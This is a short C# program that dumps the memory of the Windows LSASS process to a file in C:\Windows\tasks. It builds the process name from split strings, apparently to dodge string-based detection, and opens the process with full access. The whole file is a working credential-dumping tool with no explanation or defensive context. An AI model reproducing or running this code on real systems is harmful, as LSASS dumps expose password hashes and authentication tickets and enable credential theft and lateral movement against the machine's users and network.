using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Minidump
{
    internal class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam,
            IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static void Main(string[] args)
        {
            
            String l_n = "l" + "sa" + "ss";
            Process[] l = Process.GetProcessesByName(l_n);
            int l_p = l[0].Id;

            IntPtr h = OpenProcess(0x001F0FFF, false, l_p);

            FileStream dF = new FileStream("C:\\Windows\\tasks\\rtsd12.dmp", FileMode.Create);

            MiniDumpWriteDump(h, l_p, dF.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        }
    }
}
